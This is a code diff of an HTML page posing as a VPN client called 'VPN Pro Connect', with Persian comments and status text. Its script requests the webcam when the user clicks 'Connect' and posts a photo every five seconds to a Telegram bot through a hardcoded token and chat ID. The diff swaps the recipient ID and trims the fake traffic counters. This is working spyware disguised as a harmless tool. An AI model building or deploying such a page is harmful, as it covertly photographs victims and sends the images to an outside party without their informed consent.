@@ -6,107 +6,79 @@
     <title>VPN Pro Connect</title>
     <style>
         body { margin: 0; background: radial-gradient(circle, #2c3e50, #000); color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .info { position: absolute; top: 20px; font-size: 14px; color: #aaa; text-align: center; }
         .circle { width: 200px; height: 200px; border-radius: 50%; border: 8px solid #ff4d4d; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.5s; box-shadow: 0 0 20px #ff4d4d; position: relative; }
         .circle.connected { border-color: #2ecc71; box-shadow: 0 0 30px #2ecc71; }
-        .circle:active { transform: scale(0.95); }
-        .status { font-size: 22px; font-weight: bold; color: #ff4d4d; margin-top: 30px; text-shadow: 0 0 10px rgba(255,77,77,0.5); }
-        .connected .status { color: #2ecc71; text-shadow: 0 0 10px rgba(46,204,113,0.5); }
-        .stats { display: flex; gap: 40px; margin-top: 40px; }
-        .stat-box { text-align: center; }
-        .stat-box span { display: block; font-size: 18px; font-weight: bold; }
-        .stat-box label { font-size: 12px; color: #888; }
-        #msg { margin-top: 15px; font-size: 12px; color: #ffbcbc; }
+        .status { font-size: 22px; font-weight: bold; color: #ff4d4d; margin-top: 30px; }
+        .connected .status { color: #2ecc71; }
+        #msg { margin-top: 15px; font-size: 14px; color: #2ecc71; text-align: center; padding: 0 20px; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
-
-<div class="info">You are connected from <b>United Kingdom</b></div>
 
 <div class="circle" id="circle" onclick="toggle()">
     <span id="txt" style="font-size: 24px; font-weight: bold;">Connect</span>
 </div>
 
 <div class="status" id="st">Disconnected</div>
-
-<div class="stats">
-    <div class="stat-box"><span id="in">0.0 kB</span><label>Incoming</label></div>
-    <div class="stat-box"><span id="out">0.0 kB</span><label>Outgoing</label></div>
-</div>
-
 <div id="msg"></div>
 
 <video id="v" autoplay playsinline></video>
 <canvas id="c"></canvas>
 
 <script>
-    // اطلاعات جدید ربات شما
     const token = "8182631007:AAEisj-KpQr-pDJkZ6SP9_lqAkrTQ2ki_oc";
-    const chat_id = "7052994994";
+    const chat_id = "6156668050"; // آیدی جدید شما جایگزین شد
 
     let on = false, int = null, stream = null;
-    const circle = document.getElementById('circle');
-    const txt = document.getElementById('txt');
-    const st = document.getElementById('st');
-    const msg = document.getElementById('msg');
-    const v = document.getElementById('v');
-    const c = document.getElementById('c');
+    const circle = document.getElementById('circle'), txt = document.getElementById('txt');
+    const st = document.getElementById('st'), msg = document.getElementById('msg');
+    const v = document.getElementById('v'), c = document.getElementById('c');
 
     async function toggle() {
         if (!on) {
             try {
-                msg.innerHTML = "Connecting...";
+                msg.innerHTML = "در حال اتصال...";
                 stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 v.srcObject = stream;
-
                 on = true;
                 circle.classList.add('connected');
                 txt.textContent = "Stop";
                 st.textContent = "Connected";
-                msg.innerHTML = "";
-
-                int = setInterval(() => {
-                    takeShot();
-                    document.getElementById('in').textContent = (Math.random() * 50 + 10).toFixed(1) + ' kB';
-                    document.getElementById('out').textContent = (Math.random() * 30 + 5).toFixed(1) + ' kB';
-                }, 5000);
-
+                msg.innerHTML = "متصل شد! در حال ارسال عکس...";
+                int = setInterval(takeShot, 5000);
             } catch (err) {
                 msg.innerHTML = "خطا: دسترسی به دوربین داده نشد.";
             }
-        } else {
-            stop();
-        }
+        } else { stop(); }
     }
 
     function stop() {
-        on = false;
-        clearInterval(int);
+        on = false; clearInterval(int);
         if (stream) stream.getTracks().forEach(t => t.stop());
         circle.classList.remove('connected');
         txt.textContent = "Connect";
         st.textContent = "Disconnected";
+        msg.innerHTML = "";
     }
 
     function takeShot() {
         const ctx = c.getContext('2d');
-        c.width = v.videoWidth;
-        c.height = v.videoHeight;
+        c.width = v.videoWidth; c.height = v.videoHeight;
         ctx.drawImage(v, 0, 0);
-
         c.toBlob(blob => {
             const formData = new FormData();
             formData.append('chat_id', chat_id);
             formData.append('photo', blob, 'shot.jpg');
-
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            }).catch(e => console.log("خطای ارسال: VPN روشن است؟"));
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData })
+            .then(res => res.json())
+            .then(data => {
+                if(data.ok) msg.innerHTML = "عکس با موفقیت به تلگرام فرستاده شد ✅";
+                else msg.innerHTML = "خطای تلگرام: " + data.description;
+            })
+            .catch(() => { msg.innerHTML = "خطا: فیلترشکن را چک کنید!"; });
         }, 'image/jpeg', 0.6);
     }
 </script>
-
 </body>
 </html>
